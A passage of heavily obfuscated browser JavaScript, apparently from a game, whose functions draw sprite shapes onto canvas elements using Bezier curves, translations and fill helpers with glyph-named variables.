			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 35, ᐃ * 151);
			Δ.bezierCurveTo(27 * ᐃ, ᐃ * 165, 31 * ᐃ, ᐃ * 173, 36 * ᐃ, ᐃ * 178);
			Δ.bezierCurveTo(56 * ᐃ, ᐃ * 185, ᐃ * 73, 184 * ᐃ, 71 * ᐃ, ᐃ * 170);
			Δ.bezierCurveTo(ᐃ * 72, ᐃ * 154, ᐃ * 71, 154 * ᐃ, 63 * ᐃ, 155 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(-ᐃΔⲆᐃⵠ * ᐃ, -ᐃᐃⲆⵠⵠ * ᐃ);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(51.5 * ᐃ, ᐃ * 342);
			Ⲇᐃᐃ(Δ, ᐃ * -14.5, ᐃ * -225, ᐃ * 29, 450 * ᐃ, ᐃ * 20);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ΔᐃΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(54 * ᐃ, 83 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 70, 69 * ᐃ, 78 * ᐃ, ᐃ * 62, 82 * ᐃ, 40 * ᐃ);
			Δ.bezierCurveTo(93 * ᐃ, 48 * ᐃ, 103 * ᐃ, 64 * ᐃ, 95 * ᐃ, 102 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 60, ᐃ * 114, ᐃ * 53, ᐃ * 103, 54 * ᐃ, 85 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⲆᐃ], Ⲇᐃ[4], ⵠᐃᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(95 * ᐃ, ᐃ * 97);
			Δ.bezierCurveTo(56 * ᐃ, ᐃ * 102, 43 * ᐃ, 77 * ᐃ, ᐃ * 71, ᐃ * 6);
			Δ.bezierCurveTo(34 * ᐃ, ᐃ * ⲆⵠⲆⲆᐃ, ⵠᐃᐃΔ * ᐃ, 43 * ᐃ, 5 * ᐃ, 76 * ᐃ);
			Δ.bezierCurveTo(4 * ᐃ, 98 * ᐃ, ᐃ * 15, 130 * ᐃ, 64 * ᐃ, 130 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 76, ᐃ * 129, 95 * ᐃ, 113 * ᐃ, ᐃ * 97, ᐃ * 97);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⵠ], Ⲇᐃ[6], 6 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(35 * ᐃ, ᐃ * 403);
			Δ.bezierCurveTo(ᐃ * 47, ᐃ * 412, ᐃ * 58, 412 * ᐃ, ᐃ * 67, 403 * ᐃ);
			Δ.bezierCurveTo(66.5 * ᐃ, ᐃ * 434, ᐃ * 66.5, 434 * ᐃ, ᐃ * 66, 465 * ᐃ);
			Δ.bezierCurveTo(56 * ᐃ, 480 * ᐃ, 40 * ᐃ, 472 * ᐃ, 36 * ᐃ, ᐃ * 465);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[ᐃⵠᐃᐃⵠ], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(37 * ᐃ, 427 * ᐃ);
			Δ.bezierCurveTo(47 * ᐃ, 435 * ᐃ, 55 * ᐃ, ᐃ * 435, ᐃ * 67, ᐃ * 427);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠᐃΔⵠΔΔⵠ], Δⵠᐃᐃⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 36, 448 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 46, ᐃ * 454, 54 * ᐃ, ᐃ * 457, ᐃ * 65, ᐃ * 449);
			ΔⲆ(Δ, ΔⵠⲆᐃΔ, Ⲇᐃ[ⵠⵠⵠΔᐃ], 6 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 55, 176 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 74, ᐃ * 175, ᐃ * 82, ᐃ * 169, 96 * ᐃ, 155 * ᐃ);
			Δ.bezierCurveTo(103 * ᐃ, 183 * ᐃ, ᐃ * 95, ᐃ * 214, 54 * ᐃ, 219 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠⲆ], Ⲇᐃ[ΔⲆᐃⵠᐃ], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(50 * ᐃ, 176 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 25, 177 * ᐃ, ᐃ * ⵠΔⵠΔΔ, 164 * ᐃ, ᐃ * 7, ᐃ * 156);
			Δ.bezierCurveTo(ᐃ * Ⲇᐃᐃᐃ, 186 * ᐃ, ᐃ * ⲆⲆᐃΔΔ, ᐃ * 201, ᐃ * 43, 220 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔⵠΔ], Ⲇᐃ[ⲆᐃᐃΔ], ᐃ * ⵠΔΔΔΔⵠⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 59, 67 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 47, ᐃ * 97, ᐃ * ⲆⵠⲆᐃΔ, ᐃ * 117, ᐃ * 11, ᐃ * 110);
			Δ.bezierCurveTo(ⵠᐃⲆΔᐃᐃᐃ * ᐃ, ᐃ * 115, 15 * ᐃ, ᐃ * 122, ᐃ * 23, ᐃ * 124);
			Δ.bezierCurveTo(46 * ᐃ, ᐃ * 118, ᐃ * 52, ᐃ * 113, 62 * ᐃ, ᐃ * 86);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[8], ᐃ * ΔᐃⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(30 * ᐃ, 125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 47, 136 * ᐃ, ᐃ * 57, ᐃ * 134, 77 * ᐃ, ᐃ * 127);
			Δ.bezierCurveTo(ᐃ * 71, ᐃ * 158, ᐃ * 71, ᐃ * 159, 66 * ᐃ, 159 * ᐃ);
			Δ.bezierCurveTo(50.5 * ᐃ, ᐃ * 156.5, ᐃ * 50.5, 156.5 * ᐃ, 35 * ᐃ, ᐃ * 154);
			Δ.bezierCurveTo(ᐃ * 31, ᐃ * 145, 31 * ᐃ, ᐃ * 136, 31 * ᐃ, 125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[ⵠⵠⵠΔᐃ], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(ᐃ * 35, 171 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 32, 221 * ᐃ, ᐃ * 43, 233 * ᐃ, ᐃ * 70, ᐃ * 247);
			Δ.bezierCurveTo(ᐃ * 75, ᐃ * 234, ᐃ * 75, ᐃ * 230, 72 * ᐃ, 221 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 48, ᐃ * 206, ᐃ * 54, 188 * ᐃ, 50 * ᐃ, ᐃ * 176);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔⲆΔᐃ], Ⲇᐃ[ΔᐃᐃⲆᐃ], 6 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 60, 68 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63, 69 * ᐃ, ᐃ * 65, ᐃ * 71, ᐃ * 67, 77 * ᐃ);
			Δ.bezierCurveTo(61 * ᐃ, 123 * ᐃ, ᐃ * 52, 137 * ᐃ, 42 * ᐃ, 150 * ᐃ);
			Δ.bezierCurveTo(38 * ᐃ, 151 * ᐃ, ᐃ * 38, 151 * ᐃ, ᐃ * 34, ᐃ * 152);
			Δ.bezierCurveTo(33 * ᐃ, ᐃ * 146.5, ᐃ * 33, ᐃ * 146.5, 32 * ᐃ, ᐃ * 141);
			Δ.bezierCurveTo(49 * ᐃ, 118 * ᐃ, ᐃ * 63, ᐃ * 87, 59 * ᐃ, 68 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃΔ], Ⲇᐃ[8], 6 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(71 * ᐃ, ᐃ * 172);
			Δ.bezierCurveTo(56 * ᐃ, ᐃ * 222, 49 * ᐃ, 234 * ᐃ, 35 * ᐃ, ᐃ * 248);
			Δ.bezierCurveTo(ᐃ * 30, ᐃ * 236, 30 * ᐃ, 230 * ᐃ, 31 * ᐃ, 217 * ᐃ);
			Δ.bezierCurveTo(44 * ᐃ, 202 * ᐃ, 49 * ᐃ, 191 * ᐃ, 52 * ᐃ, 172 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[ⵠⵠᐃΔⲆ], ΔᐃⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 35, 151 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 27, 165 * ᐃ, ᐃ * 31, 173 * ᐃ, ᐃ * 36, 178 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 56, 185 * ᐃ, 73 * ᐃ, ᐃ * 184, 71 * ᐃ, ᐃ * 170);
			Δ.bezierCurveTo(ᐃ * 72, ᐃ * 154, ᐃ * 71, 154 * ᐃ, ᐃ * 63, ᐃ * 155);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔⲆΔᐃ], Ⲇᐃ[8], ⵠᐃΔⵠⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(53 * ᐃ, 113 * ᐃ);
			Δ.bezierCurveTo(65 * ᐃ, ᐃ * 140, ᐃ * 75, 166 * ᐃ, 52 * ᐃ, 169 * ᐃ);
			Δ.bezierCurveTo(29 * ᐃ, ᐃ * 168, 41 * ᐃ, 143 * ᐃ, ᐃ * 53, ᐃ * 112);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * 6);
			return Ⲇⵠ
		}

		function ⲆᐃⵠΔᐃΔⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 175;
			Ⲇⵠ.height = ᐃ * 169;
			Δ.globalAlpha = .5;
			Δ.translate(0, 3 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 19, 139 * ᐃ);
			Δ.bezierCurveTo(18 * ᐃ, 163 * ᐃ, ᐃ * 22, 156 * ᐃ, ᐃ * 53, ᐃ * 157);
			Δ.bezierCurveTo(97.5 * ᐃ, ᐃ * 157, 97.5 * ᐃ, ᐃ * 157, 142 * ᐃ, 157 * ᐃ);
			Δ.bezierCurveTo(150 * ᐃ, ᐃ * 157, 153 * ᐃ, 156 * ᐃ, 154 * ᐃ, 142 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ]);
			Δ.globalAlpha = 1;
			Δ.translate(Ⲇᐃⵠⵠ, ᐃ * -Δⵠᐃⵠ);
			Δ.save();
			Δ.translate(86.5 * ᐃ, 81.5 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -66.5, -65.5 * ᐃ, ᐃ * 133, 131 * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ΔᐃΔⲆ * ᐃ);
			Δ.save();
			Δ.translate(84.5 * ᐃ, ᐃ * 79);
			Ⲇᐃᐃ(Δ, ᐃ * -50.5, ᐃ * -49, ᐃ * 101, ᐃ * 98, ⲆⵠⲆⲆᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆⲆ], Ⲇᐃ[ⵠⵠⵠΔ], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(42 * ᐃ, 54 * ᐃ);
			Δ.bezierCurveTo(37 * ᐃ, ᐃ * 48, 39 * ᐃ, 44 * ᐃ, 38 * ᐃ, 41 * ᐃ);
			Δ.bezierCurveTo(42 * ᐃ, ᐃ * 40, 45 * ᐃ, 40 * ᐃ, 50 * ᐃ, 41 * ᐃ);
			Δ.bezierCurveTo(85 * ᐃ, ᐃ * 36, ᐃ * 98, ᐃ * 37, 116 * ᐃ, ᐃ * 42);
			Δ.bezierCurveTo(132 * ᐃ, 39 * ᐃ, ᐃ * 132, ᐃ * 39, 133 * ᐃ, 56 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 136, 73 * ᐃ, ᐃ * 136, ᐃ * 84, ᐃ * 132, 106 * ᐃ);
			Δ.bezierCurveTo(47 * ᐃ, 113 * ᐃ, ᐃ * 85.5, 106 * ᐃ, 39 * ᐃ, 106 * ᐃ);
			Δ.bezierCurveTo(32 * ᐃ, 81 * ᐃ, 38 * ᐃ, ᐃ * 60, 42 * ᐃ, 55 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠΔ], Ⲇᐃ[ⵠᐃΔⵠ], 5 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 28, 24 * ᐃ);
			Δ.rotate(ΔⲆⵠⲆ);
			Ⲇᐃᐃ(Δ, -14 * ᐃ, ᐃ * -14, ᐃ * 28, ᐃ * 28, 4 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ΔⵠⵠΔ], ᐃ * 5);
			Δ.save();
			Δ.translate(143 * ᐃ, 23 * ᐃ);
			Δ.rotate(ΔⲆⵠⲆ);
			Ⲇᐃᐃ(Δ, -ΔⲆᐃᐃᐃ * ᐃ, -14 * ᐃ, 28 * ᐃ, 28 * ᐃ, ⲆⵠᐃΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⵠ], Ⲇᐃ[ⲆᐃᐃⲆ], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(55 * ᐃ, ᐃ * 80);
			Δ.bezierCurveTo(ᐃ * 73, ᐃ * 78, 84 * ᐃ, ᐃ * 74, ᐃ * 100, 64 * ᐃ);
			Δ.bezierCurveTo(111 * ᐃ, ᐃ * 57, ᐃ * 125, 67 * ᐃ, ᐃ * 108, 84 * ᐃ);
			Δ.bezierCurveTo(96 * ᐃ, 95 * ᐃ, 86 * ᐃ, ᐃ * 96, ᐃ * 70, 88 * ᐃ);
			Δ.bezierCurveTo(62.5 * ᐃ, ᐃ * 84, 62.5 * ᐃ, 84 * ᐃ, ᐃ * 55, ᐃ * 80);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ⲆΔⲆᐃΔΔⲆ * ᐃ, 112 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 14, 146 * ᐃ, ᐃ * 27, ᐃ * 152, 37 * ᐃ, 149 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 78, ᐃ * 155, ᐃ * 128, 150 * ᐃ, 146 * ᐃ, ᐃ * 150);
			Δ.bezierCurveTo(ᐃ * 158, ᐃ * 144, ᐃ * 158, 121 * ᐃ, ᐃ * 153, 114 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[9], ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(127 * ᐃ, 111 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 133, 136 * ᐃ, 115 * ᐃ, 149 * ᐃ, 88 * ᐃ, ᐃ * 150);
			Δ.bezierCurveTo(ᐃ * 119.5, ᐃ * 151, 119.5 * ᐃ, 151 * ᐃ, ᐃ * 151, ᐃ * 152);
			Δ.bezierCurveTo(ᐃ * 159, ᐃ * 136, ᐃ * 155, ᐃ * 126, 154 * ᐃ, 113 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠᐃᐃⲆ]);
			Δ.globalAlpha = .5;
			Δ.translate(ΔⲆⲆ, ⲆΔⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * 15, 117 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 34, ᐃ * 109, ᐃ * 61, ᐃ * 106, 94 * ᐃ, ᐃ * 109);
			Δ.bezierCurveTo(126 * ᐃ, 110 * ᐃ, 142 * ᐃ, ᐃ * 113, ᐃ * 154, 119 * ᐃ);
			Δ.bezierCurveTo(154 * ᐃ, 123 * ᐃ, 154 * ᐃ, ᐃ * 123, 154 * ᐃ, 127 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 127, ᐃ * 118, 15 * ᐃ, 122 * ᐃ, 18 * ᐃ, 129 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
			Δ.globalAlpha = ΔΔᐃⵠ;
			Δ.translate(ᐃΔΔ, ᐃ * -ⲆᐃΔᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(14 * ᐃ, ᐃ * 127);
			Δ.bezierCurveTo(ᐃ * ⲆⵠΔⵠΔΔΔ, ᐃ * 117, ᐃ * 12, 109 * ᐃ, 15 * ᐃ, 103 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 16, ᐃ * 95, 21 * ᐃ, 92 * ᐃ, ᐃ * 60, 93 * ᐃ);
			Δ.bezierCurveTo(91 * ᐃ, 93 * ᐃ, 118 * ᐃ, ᐃ * 93, 143 * ᐃ, 96 * ᐃ);
			Δ.bezierCurveTo(151 * ᐃ, 96 * ᐃ, 155 * ᐃ, ᐃ * 99, ᐃ * 156, ᐃ * 112);
			Δ.bezierCurveTo(157 * ᐃ, ᐃ * 124, 157 * ᐃ, 127 * ᐃ, 156 * ᐃ, ᐃ * 128);
			Δ.bezierCurveTo(ᐃ * 138, 112 * ᐃ, ᐃ * 100, ᐃ * 118, 84 * ᐃ, 118 * ᐃ);
			Δ.bezierCurveTo(28 * ᐃ, ᐃ * 118, ⲆᐃᐃΔΔ * ᐃ, 120 * ᐃ, ᐃ * ⵠⵠΔΔᐃⵠⲆ, 127 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠᐃ], Ⲇᐃ[5], ᐃ * 5);
			Δ.save();
			Δ.translate(27.5 * ᐃ, ᐃ * 138.5);
			Ⲇᐃᐃ(Δ, ᐃ * -13.5, ᐃ * -14.5, 27 * ᐃ, 29 * ᐃ, 4 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[2], ᐃ * ⵠⵠΔⵠ);
			Δ.save();
			Δ.translate(ᐃ * 143.5, 137 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -13.5, ᐃ * -ΔⵠⵠⲆⵠᐃᐃ, ᐃ * 27, ᐃ * 28, ᐃ * 4);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[2], ᐃ * ⵠᐃΔⲆ);
			return Ⲇⵠ
		}

		function ΔΔⵠᐃⵠⲆᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 248;
			Ⲇⵠ.height = 128 * ᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 137, ᐃ * ᐃΔⲆΔᐃ);
			Δ.bezierCurveTo(ᐃ * 169, 14 * ᐃ, 212 * ᐃ, ᐃ * ⵠⵠⲆΔⵠⵠΔ, 241 * ᐃ, 5 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 211, ᐃ * 63, ᐃ * 158, ᐃ * 92, 103 * ᐃ, ᐃ * 109);
			Δ.bezierCurveTo(ᐃ * 73, 126 * ᐃ, 54 * ᐃ, 124 * ᐃ, ᐃ * ⵠⵠⵠⲆⲆ, 99 * ᐃ);
			Δ.bezierCurveTo(82 * ᐃ, ᐃ * 63, ᐃ * 113, 35 * ᐃ, 137 * ᐃ, ᐃ * 8);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔⵠΔⵠ], ᐃ * 14);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 73, ᐃ * 124);
			Δ.bezierCurveTo(ᐃ * 111, ᐃ * 126, 162 * ᐃ, ᐃ * 97, 203 * ᐃ, ᐃ * 61);
			Δ.bezierCurveTo(ᐃ * 156, ᐃ * 98, 131 * ᐃ, 106 * ᐃ, ᐃ * 105, 109 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 99, 121 * ᐃ, 87 * ᐃ, 124 * ᐃ, 72 * ᐃ, ᐃ * 124);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃⵠⵠ], Ⲇᐃ[3], 1 * ᐃ);
			return Ⲇⵠ
		}

		function ⲆΔⵠⵠⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 90;
			Ⲇⵠ.height = 98 * ᐃ;
			Δ.translate(ᐃΔΔ, ᐃ * 4);
			if (0 === ⵠᐃ) {
				Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
				Δ.save();
				Δ.translate(44 * ᐃ, 50 * ᐃ);
				Δ.rotate(1.4);
				ⵠΔⵠᐃ(Δ, ⵠᐃⵠᐃΔΔΔ, ᐃ * 41, ᐃ * 10);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[0])
			}
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(44 * ᐃ, ᐃ * 44);
			Δ.rotate(1.4);
			ⵠΔⵠᐃ(Δ, 7, 41 * ᐃ, ᐃⵠᐃΔⵠ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ⲆⲆⲆΔ);
			ⵠΔⵠᐃ(Δ, 7, 35 * ᐃ, ᐃ * ⲆⲆᐃΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠᐃΔΔ], ᐃ * ⲆⵠΔⵠ);
			ⵠΔⵠᐃ(Δ, 7, 23 * ᐃ, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[5]);
			Δ.save();
			Δ.translate(ᐃ * 45, 45 * ᐃ);
			Δ.rotate(ᐃΔΔ);
			Ⲇᐃᐃ(Δ, ᐃ * -9, -25.5 * ᐃ, 18 * ᐃ, 51 * ᐃ, 30 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⵠΔΔᐃΔ], ⵠⲆⵠⲆ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 45, 45 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, ᐃ * -26, -ΔⲆᐃᐃⲆⵠᐃ * ᐃ, ᐃ * 52, ᐃ * 18, 30 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[4], 2 * ᐃ);
			ⵠᐃᐃ(Δ, 45 * ᐃ, 29 * ᐃ, 7 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, 45 * ᐃ, ᐃ * 61, ᐃ * ⲆⲆⲆᐃΔ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⲆ]);
			ⵠᐃᐃ(Δ, ᐃ * 28, ᐃ * 45, ᐃ * 7);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⵠ]);
			ⵠᐃᐃ(Δ, ᐃ * 62, ᐃ * 45, ᐃ * 7);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			return Ⲇⵠ
		}

		function ⵠΔⲆⵠⵠΔⵠⵠᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 118;
			Ⲇⵠ.height = ᐃ * 129;
			Δ.save();
			Δ.translate(ᐃ * 90, 90 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -86.5, ᐃ * -86, 110 * ᐃ, ᐃ * 110, ⲆⲆⵠⲆᐃᐃⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ], Ⲇᐃ[1], 4);
			return Ⲇⵠ
		}

		function ᐃᐃᐃᐃΔᐃⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 135;
			Ⲇⵠ.height = ᐃ * 120;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(3.5 * ᐃ, ᐃ * 55.25);
			Δ.bezierCurveTo(ᐃ * 3.5, 114.25 * ᐃ, ᐃ * 2.5, 109.25 * ᐃ, ᐃ * 3.5, ᐃ * 112.25);
			Δ.bezierCurveTo(5.5 * ᐃ, ᐃ * 119.25, 8.5 * ᐃ, ᐃ * 119.25, 11.5 * ᐃ, 119.25 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 15.5, 114.25 * ᐃ, ᐃ * 13.5, ᐃ * 95.25, ᐃ * 14.5, ᐃ * 82.25);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ᐃⲆᐃ], ᐃ * ᐃⵠⵠⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(6.5 * ᐃ, 43.25 * ᐃ);
			Δ.bezierCurveTo(3.5 * ᐃ, ᐃ * 27.25, ᐃ * 7.5, ᐃ * 20.25, ᐃ * 25.5, ᐃ * 11.25);
			Δ.bezierCurveTo(45.5 * ᐃ, ᐃ * -.75, 73.5 * ᐃ, 1.25 * ᐃ, ᐃ * 107.5, 10.25 * ᐃ);
			Δ.bezierCurveTo(131.5 * ᐃ, 21.25 * ᐃ, 125.5 * ᐃ, 34.25 * ᐃ, 125.5 * ᐃ, ᐃ * 36.25);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ᐃᐃⵠ], 7 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(120.5 * ᐃ, 62.25 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 121.5, 95.25 * ᐃ, 120.5 * ᐃ, 80.25 * ᐃ, 120.5 * ᐃ, 100.25 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 118.5, 119.25 * ᐃ, 123.5 * ᐃ, 118.25 * ᐃ, 129.5 * ᐃ, 113.25 * ᐃ);
